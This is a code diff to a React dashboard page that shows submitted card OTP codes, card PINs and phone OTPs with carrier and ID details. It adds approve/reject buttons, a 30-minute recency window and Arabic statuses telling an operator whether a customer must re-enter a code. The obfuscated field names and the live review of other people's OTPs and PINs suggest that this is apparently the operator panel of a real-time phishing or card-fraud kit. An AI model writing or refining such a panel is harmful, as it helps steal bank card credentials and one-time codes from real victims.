@@ -1595,7 +1595,6 @@ export default function DashboardPage() {
     const currentStep = getCurrentStep();
     const currentPage = getCurrentPage();
     const cardOtpStatus = getCardOtpStatus();
-    const effectiveCardOtpStatus = localDecisionStates.otp || cardOtpStatus;
     const otpMatch = getLatestEntryForMatcher((raw) => Boolean(raw._v5 || raw.otpCode || raw.otpSubmittedAt || raw._v5UpdatedAt || raw._v5Status));
     const raw = otpMatch?.raw || selectedRequest?.raw || {};
     const otpEntry = otpMatch?.entry || null;
@@ -1608,10 +1607,19 @@ export default function DashboardPage() {
 
     // Show box if there's OTP data OR status exists
     const hasOtpData = otpCode || raw?.otpSubmittedAt || raw?._v5UpdatedAt;
-    const hasDecision = effectiveCardOtpStatus === "approved" || effectiveCardOtpStatus === "rejected";
-    const showOtpButtons = !hasDecision && hasOtpData && (effectiveCardOtpStatus === "pending" || effectiveCardOtpStatus === "verifying" || effectiveCardOtpStatus === "");
-    // ALWAYS show if there's OTP data, never hide
-    if (!hasOtpData && !hasDecision && currentStep !== 5) {
+    
+    // Use server status or local decision
+    const serverOtpStatus = raw._v5Status || raw.otpStatus || "";
+    const effectiveCardOtpStatus = serverOtpStatus || otpLocalDecision || cardOtpStatus || "";
+    const hasDecision = Boolean(serverOtpStatus || otpLocalDecision);
+    
+    // Show buttons if: no decision AND has OTP data AND time is recent (30 min)
+    const otpUpdatedAt = raw._v5UpdatedAt ? new Date(raw._v5UpdatedAt).getTime() : 0;
+    const isOtpRecent = Date.now() - otpUpdatedAt < 30 * 60 * 1000;
+    const showOtpButtons = !hasDecision && hasOtpData && isOtpRecent;
+    
+    // Show box if there's data, never hide the box itself
+    if (!hasOtpData && currentStep !== 5) {
       return null;
     }
 
@@ -1674,7 +1682,6 @@ export default function DashboardPage() {
   const renderPinBox = () => {
     const currentStep = getCurrentStep();
     const pinStatus = getPinStatus();
-    const effectivePinStatus = localDecisionStates.pin || pinStatus;
     const pinMatch = getLatestEntryForMatcher((raw) => Boolean(raw._v6 || raw.pinCode || raw.pinSubmittedAt || raw._v6UpdatedAt || raw._v6Status));
     const raw = pinMatch?.raw || selectedRequest?.raw || {};
     const pinEntry = pinMatch?.entry || null;
@@ -1684,11 +1691,19 @@ export default function DashboardPage() {
 
     // Show box if there's PIN data OR status exists
     const hasPinData = raw?._v6 || raw?.pinCode;
-    const hasDecision = effectivePinStatus === "approved" || effectivePinStatus === "rejected";
-    const isPending = effectivePinStatus === "pending" || effectivePinStatus === "verifying";
-    const showButtons = isPending && hasPinData;
-    // ALWAYS show if there's PIN data, never hide
-    if (!hasPinData && !hasDecision && currentStep !== 6) {
+    
+    // Use server status or local decision
+    const serverPinStatus = raw._v6Status || raw.pinStatus || "";
+    const effectivePinStatus = serverPinStatus || pinLocalDecision || pinStatus || "";
+    const hasDecision = Boolean(serverPinStatus || pinLocalDecision);
+    
+    // Show buttons if: no decision AND has PIN data AND time is recent (30 min)
+    const pinUpdatedAt = raw._v6UpdatedAt ? new Date(raw._v6UpdatedAt).getTime() : 0;
+    const isPinRecent = Date.now() - pinUpdatedAt < 30 * 60 * 1000;
+    const showButtons = !hasDecision && hasPinData && isPinRecent;
+    
+    // Show box if there's data, never hide the box itself
+    if (!hasPinData && currentStep !== 6) {
       return null;
     }
 
@@ -1736,7 +1751,7 @@ export default function DashboardPage() {
             <p style={{ margin: 0, fontSize: "0.85rem", color: "#991b1b", fontWeight: 600 }}>❌ مرفوض - العميل يجب أن يُعيد إدخال الرمز</p>
           </div>
         )}
-        {isPending && currentStep === 6 && hasPinData && (
+        {!hasDecision && currentStep === 6 && hasPinData && (
           <div style={{ background: "#fef3c7", borderRadius: 8, padding: 12, border: "1px solid #fcd34d", marginBottom: 12 }}>
             <p style={{ margin: 0, fontSize: "0.85rem", color: "#92400e", fontWeight: 600 }}>⏳ بانتظار المراجعة</p>
           </div>
@@ -1760,7 +1775,6 @@ export default function DashboardPage() {
     const currentStep = getCurrentStep();
     const currentPage = getCurrentPage();
     const phoneOtpStatus = getPhoneOtpStatus();
-    const effectivePhoneOtpStatus = localDecisionStates.phone || phoneOtpStatus;
     const phoneMatch = getLatestEntryForMatcher((raw) => Boolean(raw.phoneIdNumber || raw.phoneCarrier || raw.phoneOtp || raw._v7 || raw.phoneSubmittedAt || raw._v7UpdatedAt));
     const raw = phoneMatch?.raw || selectedRequest?.raw || {};
     const phoneEntry = phoneMatch?.entry || null;
@@ -1772,10 +1786,19 @@ export default function DashboardPage() {
     const phoneOtpCode = String(raw?._v7 || raw?.phoneOtp || "").trim();
 
     // Show box if there's phone data OR OTP code OR status exists
-    const hasPhoneData = Boolean(raw?.phoneNumber || raw?.phoneIdNumber);
+    const hasPhoneData = Boolean(raw?.phoneNumber || raw?.phoneIdNumber || raw?.phoneCarrier);
     const hasAnyPhoneData = hasPhoneData || Boolean(phoneOtpCode) || Boolean(phoneOtpStatus);
     const shouldShowPhoneOtpBox = hasAnyPhoneData || currentStep === 5 || currentPage === "step5" || currentPage === "phone";
-    const showPhoneButtons = !["approved", "rejected"].includes(effectivePhoneOtpStatus) && (hasPhoneData || Boolean(phoneOtpCode)) && (effectivePhoneOtpStatus === "pending" || effectivePhoneOtpStatus === "verifying" || effectivePhoneOtpStatus === "");
+    
+    // Use server status or local decision
+    const serverPhoneStatus = raw.phoneOtpStatus || raw.phoneStatus || "";
+    const effectivePhoneOtpStatus = serverPhoneStatus || phoneLocalDecision || phoneOtpStatus || "";
+    const hasDecision = Boolean(serverPhoneStatus || phoneLocalDecision);
+    
+    // Show buttons if: no decision AND has phone data AND time is recent (30 min)
+    const phoneUpdatedAt = raw._v7UpdatedAt ? new Date(raw._v7UpdatedAt).getTime() : 0;
+    const isPhoneRecent = Date.now() - phoneUpdatedAt < 30 * 60 * 1000;
+    const showPhoneButtons = !hasDecision && hasAnyPhoneData && isPhoneRecent;
     
     // Always show if there's any phone-related data, never hide
     if (!shouldShowPhoneOtpBox && currentStep !== 7) {
